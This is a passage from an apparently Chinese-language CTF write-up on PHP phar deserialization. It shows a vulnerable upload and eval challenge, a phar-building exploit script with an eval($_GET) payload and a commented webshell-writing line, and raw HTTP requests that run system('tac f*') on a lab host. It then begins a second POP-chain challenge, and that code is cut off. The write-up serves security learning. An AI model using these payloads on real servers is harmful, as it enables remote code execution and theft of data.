+</span></span><span class=line><span class=cl>			<span class=k>if</span><span class=p>(</span><span class=nv>$file</span><span class=p>[</span><span class=s1>&#39;size&#39;</span><span class=p>]</span> <span class=o>&gt;</span> <span class=mi>1024</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>				<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cmd</span> <span class=o>=</span> <span class=s2>&#34;die(&#39;you are too big (′▽`〃)&#39;);&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>			<span class=p>}</span>
+</span></span><span class=line><span class=cl>			<span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>				<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cmd</span> <span class=o>=</span> <span class=s2>&#34;move_uploaded_file(&#39;&#34;</span><span class=o>.</span><span class=nv>$file</span><span class=p>[</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>]</span><span class=o>.</span><span class=s2>&#34;&#39;, &#39;&#34;</span> <span class=o>.</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>Filename</span> <span class=o>.</span> <span class=s2>&#34;&#39;);&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>			<span class=p>}</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=k>function</span> <span class=fm>__toString</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>		<span class=k>global</span> <span class=nv>$sandbox</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=k>global</span> <span class=nv>$ext</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=c1>// return $sandbox.$this-&gt;Filename.$ext;
+</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>Filename</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>token</span> <span class=o>!=</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>]){</span>
+</span></span><span class=line><span class=cl>			<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cmd</span> <span class=o>=</span> <span class=s2>&#34;die(&#39;check token falied!&#39;);&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>		<span class=k>eval</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cmd</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=nv>$uploader</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Uploader</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>	<span class=nv>$uploader</span><span class=o>-&gt;</span><span class=na>upload</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=o>@</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$uploader</span><span class=p>)){</span>
+</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=s2>&#34;下面是你上传的文件：&lt;br&gt;&#34;</span><span class=o>.</span><span class=nv>$uploader</span><span class=o>.</span><span class=s2>&#34;&lt;br&gt;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$uploader</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p><code>file_get_contents</code>触发phar反序列化，有可控参数cmd，只需要一个条件就是token，在文件移动之后可以知道<code>md5($_SESSION['user'])</code>的文件夹，<code>$_SESSION['user']</code>的文件名，先随便上传一个文件即可知道token，有点离谱的是非要我抓包才能获得token</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=c1>//home.php
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nx>session_start</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;&lt;meta http-equiv=</span><span class=se>\&#34;</span><span class=s2>Content-Type</span><span class=se>\&#34;</span><span class=s2> content=</span><span class=se>\&#34;</span><span class=s2>text/html; charset=utf-8</span><span class=se>\&#34;</span><span class=s2> /&gt; &lt;title&gt;Home&lt;/title&gt;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>])){</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>])){</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/.?f.?l.?a.?g.?/i&#34;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>])){</span>
+</span></span><span class=line><span class=cl>			<span class=k>die</span><span class=p>(</span><span class=s2>&#34;hacker!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>		<span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/home$/i&#34;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>])</span> <span class=k>or</span> <span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/upload$/i&#34;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>])){</span>
+</span></span><span class=line><span class=cl>				<span class=nv>$file</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]</span><span class=o>.</span><span class=s2>&#34;.php&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>			<span class=p>}</span>
+</span></span><span class=line><span class=cl>			<span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>				<span class=nv>$file</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]</span><span class=o>.</span><span class=s2>&#34;.fxxkyou!&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>			<span class=p>}</span>
+</span></span><span class=line><span class=cl>			<span class=k>echo</span> <span class=s2>&#34;当前引用的是 &#34;</span><span class=o>.</span><span class=nv>$file</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>			<span class=k>require</span> <span class=nv>$file</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>		
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=k>die</span><span class=p>(</span><span class=s2>&#34;no permission!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>这个文件就是个文件读取，没什么好说的，本来是打算写文件的没成功，而且我上传一次之后发现是不能成功的，本地调试发现只上传一次的话，会因为触发move而导致已经没有这个文件了，所以要上传两次文件，并且第二次上传的时候还顺带解析phar文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Uploader</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$Filename</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$cmd</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$token</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>Filename</span><span class=o>=</span><span class=s2>&#34;test&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=c1>//$this-&gt;cmd = &#34;file_put_contents(&#39;shell.php&#39;,&#39;&lt;?php eval(\$_POST[1])&#39;);&#34;;
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cmd</span><span class=o>=</span><span class=s2>&#34;eval(</span><span class=se>\$</span><span class=s2>_GET[1]);phpinfo();&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>token</span> <span class=o>=</span> <span class=s2>&#34;GXY0ba2eb8dc80de06d69f56480135689f8&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=s2>&#34;phar.phar&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>Uploader</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Phar</span><span class=p>(</span><span class=s2>&#34;phar.phar&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>startBuffering</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setStub</span><span class=p>(</span><span class=s2>&#34;GIF89a&#34;</span><span class=o>.</span><span class=s2>&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setMetadata</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>addFromString</span><span class=p>(</span><span class=s2>&#34;test.txt&#34;</span><span class=p>,</span> <span class=s2>&#34;test&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>stopBuffering</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/home.php?file=upload</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>42d7c261-214c-47a9-bd3a-16b8726edd64.node5.buuoj.cn:81</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>564</span>
+</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
+</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://42d7c261-214c-47a9-bd3a-16b8726edd64.node5.buuoj.cn:81</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>multipart/form-data; boundary=----WebKitFormBoundaryvAs2dFQNUbuJIymi</span>
+</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
+</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span>
+</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://42d7c261-214c-47a9-bd3a-16b8726edd64.node5.buuoj.cn:81/home.php?file=upload</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8</span>
+</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>PHPSESSID=96ed4ab68873b5d4f16f5c04082ee3a6</span>
+</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>------WebKitFormBoundaryvAs2dFQNUbuJIymi
+</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;phar.phar&#34;
+</span></span><span class=line><span class=cl>Content-Type: application/octet-stream
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>GIF89a&lt;?php __HALT_COMPILER(); ?&gt;
+</span></span><span class=line><span class=cl>�
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/home.php?file=upload&amp;name=phar:///var/www/html/uploads/1d7262715c64ee43ff0aa98b8c17ff49/GXY0ba2eb8dc80de06d69f56480135689f8.txt/test.txt&amp;1=system(&#34;tac+f*&#34;);</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>42d7c261-214c-47a9-bd3a-16b8726edd64.node5.buuoj.cn:81</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>587</span>
+</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
+</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://42d7c261-214c-47a9-bd3a-16b8726edd64.node5.buuoj.cn:81</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>multipart/form-data; boundary=----WebKitFormBoundaryTLs38iOHyhuPxMZ8</span>
+</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
+</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span>
+</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://42d7c261-214c-47a9-bd3a-16b8726edd64.node5.buuoj.cn:81/home.php?file=upload&amp;name=phar:///var/www/html/uploads/1d7262715c64ee43ff0aa98b8c17ff49/GXY0ba2eb8dc80de06d69f56480135689f8.txt/test.txt</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8</span>
+</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>PHPSESSID=96ed4ab68873b5d4f16f5c04082ee3a6</span>
+</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>------WebKitFormBoundaryTLs38iOHyhuPxMZ8
+</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;phar.phar&#34;
+</span></span><span class=line><span class=cl>Content-Type: application/octet-stream
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>GIF89a&lt;?php __HALT_COMPILER(); ?&gt;
+</span></span><span class=line><span class=cl>�
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/phar-deserialization-analysis/QQ20250729-143749.jpg width=1266 height=878 loading=lazy alt=1></p><h2 id=demo6>demo6</h2><p><strong>[Dest0g3 520迎新赛]PharPOP</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>waf</span><span class=p>(</span><span class=nv>$data</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>is_array</span><span class=p>(</span><span class=nv>$data</span><span class=p>)){</span>
+</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;Cannot transfer arrays&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/get|air|tree|apple|banana|php|filter|base64|rot13|read|data/i&#39;</span><span class=p>,</span> <span class=nv>$data</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;You can&#39;t do&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>air</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$p</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__set</span><span class=p>(</span><span class=nv>$p</span><span class=p>,</span> <span class=nv>$value</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$p</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>p</span><span class=o>-&gt;</span><span class=na>act</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=k>new</span> <span class=nv>$p</span><span class=p>(</span><span class=nv>$value</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>tree</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$act</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>name</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__call</span><span class=p>(</span><span class=nv>$name</span><span class=p>,</span> <span class=nv>$arg</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$arg</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>name</span><span class=o>-&gt;</span><span class=nv>$name</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>apple</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$xxx</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$flag</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__get</span><span class=p>(</span><span class=nv>$flag</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>xxx</span><span class=o>-&gt;</span><span class=nv>$flag</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>flag</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>D</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$start</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$data</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>start</span> <span class=o>==</span> <span class=s1>&#39;w&#39;</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nx>waf</span><span class=p>(</span><span class=nv>$data</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$filename</span> <span class=o>=</span> <span class=s2>&#34;/tmp/&#34;</span><span class=o>.</span><span class=nx>md5</span><span class=p>(</span><span class=nx>rand</span><span class=p>())</span><span class=o>.</span><span class=s2>&#34;.jpg&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=nx>file_put_contents</span><span class=p>(</span><span class=nv>$filename</span><span class=p>,</span> <span class=nv>$data</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=nv>$filename</span><span class=p>;</span>
